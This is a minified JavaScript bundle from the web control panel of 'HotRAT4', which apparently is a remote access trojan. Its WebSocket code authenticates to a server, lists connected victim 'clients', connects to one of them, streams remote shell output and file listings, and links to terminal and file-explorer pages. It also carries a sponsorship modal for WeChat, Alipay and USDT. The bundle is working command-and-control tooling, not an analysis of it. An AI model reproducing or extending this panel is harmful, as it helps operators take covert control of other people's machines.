(self.webpackChunk_N_E=self.webpackChunk_N_E||[]).push([[177],{4744:(e,t,a)=>{Promise.resolve().then(a.bind(a,1241)),Promise.resolve().then(a.bind(a,3925)),Promise.resolve().then(a.bind(a,5654)),Promise.resolve().then(a.t.bind(a,8563,23)),Promise.resolve().then(a.t.bind(a,2160,23)),Promise.resolve().then(a.t.bind(a,1477,23))},1241:(e,t,a)=>{"use strict";a.d(t,{Providers:()=>c});var s=a(5155);a(2115);var r=a(8781),l=a(6046),n=a(7113);function c(e){let{children:t,themeProps:a}=e,c=(0,l.useRouter)();return(0,s.jsx)(r.M,{navigate:c.push,children:(0,s.jsx)(n.N,{...a,children:t})})}},5654:(e,t,a)=>{"use strict";a.d(t,{WebSocketProvider:()=>c,h:()=>n});var s=a(5155),r=a(2115);let l=(0,r.createContext)(void 0);function n(){let e=(0,r.useContext)(l);if(!e)throw Error("useWebSocket 必须在 WebSocketProvider 内部使用");return e}function c(e){let{children:t}=e,[a,n]=(0,r.useState)([]),[c,i]=(0,r.useState)(null),[o,d]=(0,r.useState)(!0),[h,u]=(0,r.useState)(""),[x,f]=(0,r.useState)(null),[p,m]=(0,r.useState)(""),[j,g]=(0,r.useState)([]),b=function(e){let t=arguments.length>1&&void 0!==arguments[1]&&arguments[1];m(a=>t?"".concat(a).concat(e):e)},v=async()=>{try{let e=localStorage.getItem("serverapi"),t=localStorage.getItem("serverkey");if(!e||!t)throw Error("请先设置服务器API地址和密钥");let a=await fetch("http://".concat(e,"/api/auth/build?key=").concat(t)),s=await a.json();if(200!==s.code||!s.data)throw Error("获取TOKEN失败");return s.data}catch(e){throw u(e instanceof Error?e.message:"获取TOKEN时发生错误"),e}},y=async e=>{try{let t=await v();e.send("AUTH\n".concat(t))}catch(e){console.error("获取token失败:",e),u("获取验证token失败")}},w=async()=>{if(!c||c.readyState!==WebSocket.OPEN){u("WebSocket连接未就绪");return}d(!0),await y(c),d(!1)},N=(0,r.useCallback)(e=>{if(!c||c.readyState!==WebSocket.OPEN){u("WebSocket连接未就绪");return}f(e),c.send("CONNECT\n".concat(e)),console.log("请求连接客户端: ".concat(e))},[c]),k=(0,r.useCallback)(()=>{if(!c||c.readyState!==WebSocket.OPEN){u("WebSocket连接未就绪");return}x&&(c.send("DISCONNECT\n".concat(x)),console.log("断开连接客户端: ".concat(x))),f(null)},[c,x]),S=e=>{g(e.split("\\n").map(e=>{let t=e.split("|");if(t.length>=3){let[e,a,s]=t;return{name:e,time:a,type:"DIR"===s?"DIR":"FILE"}}return null}).filter(e=>null!==e))};return(0,r.useEffect)(()=>{let e=async()=>{let t=localStorage.getItem("serveraddress");if(!t){u("请先在设置中配置服务器地址"),d(!1);return}try{d(!0);let a=new WebSocket("ws://".concat(t));a.onopen=async()=>{console.log("WebSocket 连接已建立");try{let e=await v();a.send("AUTH\n".concat(e))}catch(e){u(e instanceof Error?e.message:"认证失败")}},a.onmessage=e=>{try{let t=JSON.parse(e.data);switch(console.log("接收到消息:",t),t.type){case"CLIENTS":Array.isArray(t.data)?n(t.data):n([t.data]);break;case"CONNECTION_STATUS":f(t.connected?t.clientId:null);break;case"ERROR":u(t.message);break;case"SHELL":b(t.data+"\n",!0);break;case"FILES":S(t.data);break;default:console.warn("未知消息类型:",t.type)}}catch(t){console.error("消息解析失败:",e.data)}},a.onerror=e=>{u("WebSocket 错误: ".concat(e))},a.onclose=t=>{1e3!==t.code&&setTimeout(e,3e3)},i(a)}catch(e){u("连接失败: ".concat(e))}finally{d(!1)}};e()},[]),(0,s.jsx)(l.Provider,{value:{clients:a,loading:o,error:h,ws:c,connectedClientId:x,shellLog:p,fileList:j,setshellLog:b,connectToClient:N,disconnectClient:k,refreshClients:w},children:t})}},3925:(e,t,a)=>{"use strict";a.d(t,{Navbar:()=>R});var s=a(5155),r=a(8400),l=a(6205),n=a(2433),c=a(3779),i=a(8474),o=a(8380),d=a(705),h=a(528),u=a(3669),x=a(6620),f=a(7396),p=a(3463);let m={navItems:[{label:"主页",href:"/"},{label:"设备",href:"/client"},{label:"终端",href:"/console"},{label:"文档",href:"/docs"},{label:"文件",href:"/explorer"},{label:"设置",href:"/setting"}],links:{github:"https://github.com/Yuxi-IT/HotRAT4",sponsor:"",docs:"/docs"}};var j=a(9480),g=a(619),b=a(7113),v=a(1632),y=a(2115);let w=e=>{let{size:t=36,width:a,height:r,...l}=e;return(0,s.jsx)("svg",{fill:"none",height:t||r,viewBox:"0 0 32 32",width:t||a,...l,children:(0,s.jsx)("path",{clipRule:"evenodd",d:"M17.6482 10.1305L15.8785 7.02583L7.02979 22.5499H10.5278L17.6482 10.1305ZM19.8798 14.0457L18.11 17.1983L19.394 19.4511H16.8453L15.1056 22.5499H24.7272L19.8798 14.0457Z",fill:"currentColor",fillRule:"evenodd"})})},N=e=>{let{size:t=24,width:a,height:r,...l}=e;return(0,s.jsx)("svg",{height:t||r,viewBox:"0 0 24 24",width:t||a,...l,children:(0,s.jsx)("path",{clipRule:"evenodd",d:"M12.026 2c-5.509 0-9.974 4.465-9.974 9.974 0 4.406 2.857 8.145 6.821 9.465.499.09.679-.217.679-.481 0-.237-.008-.865-.011-1.696-2.775.602-3.361-1.338-3.361-1.338-.452-1.152-1.107-1.459-1.107-1.459-.905-.619.069-.605.069-.605 1.002.07 1.527 1.028 1.527 1.028.89 1.524 2.336 1.084 2.902.829.091-.645.351-1.085.635-1.334-2.214-.251-4.542-1.107-4.542-4.93 0-1.087.389-1.979 1.024-2.675-.101-.253-.446-1.268.099-2.64 0 0 .837-.269 2.742 1.021a9.582 9.582 0 0 1 2.496-.336 9.554 9.554 0 0 1 2.496.336c1.906-1.291 2.742-1.021 2.742-1.021.545 1.372.203 2.387.099 2.64.64.696 1.024 1.587 1.024 2.675 0 3.833-2.33 4.675-4.552 4.922.355.308.675.916.675 1.846 0 1.334-.012 2.41-.012 2.737 0 .267.178.577.687.479C19.146 20.115 22 16.379 22 11.974 22 6.465 17.535 2 12.026 2z",fill:"currentColor",fillRule:"evenodd"})})},k=e=>{let{size:t=24,width:a,height:r,...l}=e;return(0,s.jsx)("svg",{"aria-hidden":"true",focusable:"false",height:t||r,role:"presentation",viewBox:"0 0 24 24",width:t||a,...l,children:(0,s.jsx)("path",{d:"M21.53 15.93c-.16-.27-.61-.69-1.73-.49a8.46 8.46 0 01-1.88.13 8.409 8.409 0 01-5.91-2.82 8.068 8.068 0 01-1.44-8.66c.44-1.01.13-1.54-.09-1.76s-.77-.55-1.83-.11a10.318 10.318 0 00-6.32 10.21 10.475 10.475 0 007.04 8.99 10 10 0 002.89.55c.16.01.32.02.48.02a10.5 10.5 0 008.47-4.27c.67-.93.49-1.519.32-1.79z",fill:"currentColor"})})},S=e=>{let{size:t=24,width:a,height:r,...l}=e;return(0,s.jsx)("svg",{"aria-hidden":"true",focusable:"false",height:t||r,role:"presentation",viewBox:"0 0 24 24",width:t||a,...l,children:(0,s.jsxs)("g",{fill:"currentColor",children:[(0,s.jsx)("path",{d:"M19 12a7 7 0 11-7-7 7 7 0 017 7z"}),(0,s.jsx)("path",{d:"M12 22.96a.969.969 0 01-1-.96v-.08a1 1 0 012 0 1.038 1.038 0 01-1 1.04zm7.14-2.82a1.024 1.024 0 01-.71-.29l-.13-.13a1 1 0 011.41-1.41l.13.13a1 1 0 010 1.41.984.984 0 01-.7.29zm-14.28 0a1.024 1.024 0 01-.71-.29 1 1 0 010-1.41l.13-.13a1 1 0 011.41 1.41l-.13.13a1 1 0 01-.7.29zM22 13h-.08a1 1 0 010-2 1.038 1.038 0 011.04 1 .969.969 0 01-.96 1zM2.08 13H2a1 1 0 010-2 1.038 1.038 0 011.04 1 .969.969 0 01-.96 1zm16.93-7.01a1.024 1.024 0 01-.71-.29 1 1 0 010-1.41l.13-.13a1 1 0 011.41 1.41l-.13.13a.984.984 0 01-.7.29zm-14.02 0a1.024 1.024 0 01-.71-.29l-.13-.14a1 1 0 011.41-1.41l.13.13a1 1 0 010 1.41.97.97 0 01-.7.3zM12 3.04a.969.969 0 01-1-.96V2a1 1 0 012 0 1.038 1.038 0 01-1 1.04z"})]})})},E=e=>{let{size:t=24,width:a,height:r,...l}=e;return(0,s.jsx)("svg",{"aria-hidden":"true",focusable:"false",height:t||r,role:"presentation",viewBox:"0 0 24 24",width:t||a,...l,children:(0,s.jsx)("path",{d:"M12.62 20.81c-.34.12-.9.12-1.24 0C8.48 19.82 2 15.69 2 8.69 2 5.6 4.49 3.1 7.56 3.1c1.82 0 3.43.88 4.44 2.24a5.53 5.53 0 0 1 4.44-2.24C19.51 3.1 22 5.6 22 8.69c0 7-6.48 11.13-9.38 12.12Z",fill:"currentColor",strokeLinecap:"round",strokeLinejoin:"round",strokeWidth:1.5})})},C=e=>{let{className:t,classNames:a}=e,{theme:r,setTheme:l}=(0,b.D)(),n=(0,v.wR)(),{Component:c,slots:i,isSelected:o,getBaseProps:d,getInputProps:h,getWrapperProps:u}=(0,g.K)({isSelected:"light"===r||n,"aria-label":"Switch to ".concat("light"===r||n?"dark":"light"," mode"),onChange:()=>{"light"===r?l("dark"):l("light")}});return(0,s.jsxs)(c,{...d({className:(0,p.A)("px-px transition-opacity hover:opacity-80 cursor-pointer",t,null==a?void 0:a.base)}),children:[(0,s.jsx)(j.s,{children:(0,s.jsx)("input",{...h()})}),(0,s.jsx)("div",{...u(),className:i.wrapper({class:(0,p.A)(["w-auto h-auto","bg-transparent","rounded-lg","flex items-center justify-center","group-data-[selected=true]:bg-transparent","!text-default-500","pt-px","px-0","mx-0"],null==a?void 0:a.wrapper)}),children:!o||n?(0,s.jsx)(S,{size:22}):(0,s.jsx)(k,{size:22})})]})};var T=a(4805),P=a(5130),I=a(8897),z=a(7657),W=a(867),L=a(309),O=a(9895);let R=()=>{let{isOpen:e,onOpen:t,onClose:a}=(0,T.j)(),[j,g]=y.useState("opaque"),[b,v]=y.useState("wechat"),k=e=>{g(e),t()},S={wechat:"/wxcode.jpg",alipay:"/alipay.jpg",usdt:"/usdt.jpg"};return(0,s.jsxs)(r.H,{maxWidth:"xl",position:"sticky",children:[(0,s.jsxs)(l.t,{className:"basis-1/5 sm:basis-full",justify:"start",children:[(0,s.jsx)(n.$,{as:"li",className:"gap-3 max-w-fit",children:(0,s.jsxs)(f.default,{className:"flex justify-start items-center gap-1",href:"/",children:[(0,s.jsx)(w,{}),(0,s.jsx)("p",{className:"font-bold text-inherit",children:"HotRAT4"})]})}),(0,s.jsx)("ul",{className:"hidden md:flex gap-4 justify-start ml-2",children:m.navItems.map((e,t)=>(0,s.jsx)(c.p,{children:(0,s.jsx)(f.default,{className:(0,p.A)("data-[active=true]:text-primary data-[active=true]:font-medium"),href:e.href,children:e.label})},e.href))})]}),(0,s.jsx)(l.t,{className:"hidden md:flex basis-1/5 sm:basis-full",justify:"end",children:(0,s.jsxs)(c.p,{className:"hidden md:flex gap-2",children:[(0,s.jsx)(x.h,{isExternal:!0,"aria-label":"Github",href:m.links.github,children:(0,s.jsx)(N,{className:"text-default-500"})}),(0,s.jsx)(C,{}),(0,s.jsx)(h.T,{className:"capitalize",color:"warning",variant:"flat",onPress:()=>k("blur"),children:"赞助"})]})}),(0,s.jsxs)(l.t,{className:"md:hidden basis-1 pl-4",justify:"end",children:[(0,s.jsx)(x.h,{isExternal:!0,"aria-label":"Github",href:m.links.github,children:(0,s.jsx)(N,{className:"text-default-500"})}),(0,s.jsx)(C,{}),(0,s.jsx)(i.w,{})]}),(0,s.jsx)(o.n,{children:(0,s.jsxs)("div",{className:"mx-4 mt-2 flex flex-col gap-2",children:[(0,s.jsx)(h.T,{isExternal:!0,as:x.h,className:"text-sm font-normal text-default-600 bg-default-100",href:m.links.sponsor,startContent:(0,s.jsx)(E,{className:"text-danger"}),variant:"flat",children:"赞助"}),m.navItems.map((e,t,a)=>(0,s.jsx)(d.X,{children:(0,s.jsx)(x.h,{color:0===t?"primary":"foreground",href:m.navItems[t].href,size:"lg",children:e.label})},"".concat(e,"-").concat(t,"-").concat(a)))]})}),(0,s.jsx)(P.Y,{backdrop:"blur",isOpen:e,onClose:a,children:(0,s.jsx)(I.g,{children:e=>(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(z.c,{className:"flex flex-col gap-1",children:"使用微信、支付宝或USDT赞助我们"}),(0,s.jsxs)(W.h,{className:"flex flex-col items-center gap-4",children:[(0,s.jsxs)(u.x,{children:[(0,s.jsx)(h.T,{onPress:()=>v("wechat"),color:"wechat"===b?"primary":"default",children:"微信"}),(0,s.jsx)(h.T,{onPress:()=>v("alipay"),color:"alipay"===b?"primary":"default",children:"支付宝"}),(0,s.jsx)(h.T,{onPress:()=>v("usdt"),color:"usdt"===b?"primary":"default",children:"USDT"})]}),(0,s.jsx)(O.W,{src:S[b],alt:"收款二维码",width:200,height:200,className:"rounded-lg"})]}),(0,s.jsxs)(L.q,{children:[(0,s.jsx)(h.T,{color:"danger",variant:"light",onPress:e,children:"下次吧"}),(0,s.jsx)(h.T,{color:"primary",onPress:e,children:"谢谢您"})]})]})})})]})}},8563:()=>{}},e=>{var t=t=>e(e.s=t);e.O(0,[306,783,966,528,50,392,66,441,517,358],()=>t(4744)),_N_E=e.O()}]);